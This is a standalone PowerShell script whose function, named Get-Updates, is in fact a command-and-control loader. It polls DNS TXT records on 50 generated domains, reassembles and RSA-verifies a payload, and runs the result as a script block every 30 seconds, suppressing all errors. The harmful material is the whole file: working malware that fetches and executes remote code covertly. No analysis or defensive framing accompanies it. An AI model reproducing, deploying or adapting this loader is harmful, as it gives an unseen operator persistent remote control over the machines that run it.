$ms = [IO.MemoryStream]::new();

function Get-Updates {
    param (
        $hostname
    )
    try {
        $dns = Resolve-DnsName -Name $hostname -Type 'TXT'
        $ms.SetLength(0);
        $ms.Position = 0;
        foreach ($txt in $dns) {
            try {
                if ($txt.Type -ne 'TXT') {
                    continue;
                }
                $pkt = [string]::Join('', $txt.Strings);
                if ($pkt[0] -eq '.') {
                    $dp = [System.Convert]::FromBase64String($pkt.Substring(1).Replace('_', '+'));
                    $ms.Position = [BitConverter]::ToUInt32($dp, 0);
                    $ms.Write($dp, 4, $dp.Length - 4);
                }
            }
            catch {
            }
        }

        if ($ms.Length -gt 136) {
            $ms.Position = 0;
            $sig = [byte[]]::new(128);
            $timestamp = [byte[]]::new(8);
            $buffer = [byte[]]::new($ms.Length - 136);
            $ms.Read($sig, 0, 128) | Out-Null;
            $ms.Read($timestamp, 0, 8) | Out-Null;
            $ms.Read($buffer, 0, $buffer.Length) | Out-Null;
            $pubkey = [Security.Cryptography.RSACryptoServiceProvider]::new();
            [byte[]]$bytarr = 6,2,0,0,0,164,0,0,82,83,65,49,0,4,0,0,1,0,1,0,171,136,19,139,215,31,169,242,133,11,146,105,79,13,140,88,119,0,2,249,79,17,77,152,228,162,31,56,117,89,68,182,194,170,250,16,3,78,104,92,37,37,9,250,164,244,195,118,92,190,58,20,35,134,83,10,229,114,229,137,244,178,10,31,46,80,221,73,129,240,183,9,245,177,196,77,143,71,142,60,5,117,241,54,2,116,23,225,145,53,46,21,142,158,206,250,181,241,8,110,101,84,218,219,99,196,195,112,71,93,55,111,218,209,12,101,165,45,13,36,118,97,232,193,245,221,180,169
            $pubkey.ImportCspBlob($bytarr);
            if ($pubkey.VerifyData($buffer, [Security.Cryptography.CryptoConfig]::MapNameToOID('SHA256'), $sig)) {
                return @{
                    timestamp = ([System.BitConverter]::ToUInt64($timestamp, 0));
                    text      = ([Text.Encoding]::UTF8.GetString($buffer));
                };
            }
        }
    }
    catch {
    }
    return $null;
}

while ($true) {
    try {
        $update = @{
            timestamp = 0;
            text      = '';
        };
        foreach ($c in (@("com", "xyz"))) {
            foreach ($a in (@("wmail", "fairu", "bideo", "privatproxy", "ahoravideo"))) {
                foreach ($b in (@("endpoint", "blog", "chat", "cdn", "schnellvpn"))) {
                    try {
                        $h = "$a-$b.$c";
                        $r = Get-Updates $h
                        if ($null -ne $r) {
                            if ($r.timestamp -gt $update.timestamp) {
                                $update = $r;
                            }
                        }
                    }
                    catch {
                    }
                }
            }
        }

        if ($update.text) {
            $job = Start-Job -ScriptBlock ([scriptblock]::Create($update.text));
            $job | Wait-Job -Timeout 14400;
            $job | Stop-Job;
        }
    }
    catch {
    }
    Start-Sleep -Seconds 30;
}